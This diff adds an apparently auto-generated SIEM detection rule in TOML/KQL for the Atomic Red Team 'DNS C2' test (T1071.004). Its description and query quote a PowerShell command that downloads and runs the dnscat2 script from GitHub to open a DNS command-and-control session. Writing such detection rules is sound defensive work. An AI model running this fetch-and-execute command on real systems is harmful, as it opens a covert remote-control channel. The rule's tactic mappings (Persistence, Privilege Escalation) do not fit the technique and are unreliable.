@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'DNS C2' (GUID: e7bf9802-2e78-4db9-93b5-181b7bcd37d7) of technique T1071.004 (Application Layer Protocol: DNS). Test Description: This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell. Command/Steps: IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc78..."
+from = "now-9m"
+rule_id = "088ed252-5579-4a01-a390-fc1b7f26579e"
+language = "kql"
+name = "Atomic Test: T1071.004 - DNS C2"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1071.004/T1071.004.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1071.004", "e7bf9802-2e78-4db9-93b5-181b7bcd37d7", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*(New-Object*\\\" AND powershell.script_block_text : \\\"*System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')*\\\" AND powershell.script_block_text : \\\"*Start-Dnscat2*\\\" OR (process.command_line : \\\"*(New-Object*\\\" AND process.command_line : \\\"*System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')*\\\" AND process.command_line : \\\"*Start-Dnscat2*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1071.004"
+name = "DNS C2"
+reference = "https://attack.mitre.org/techniques/T1071/004"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1071/004"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1071/004"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1071/004"
+
+
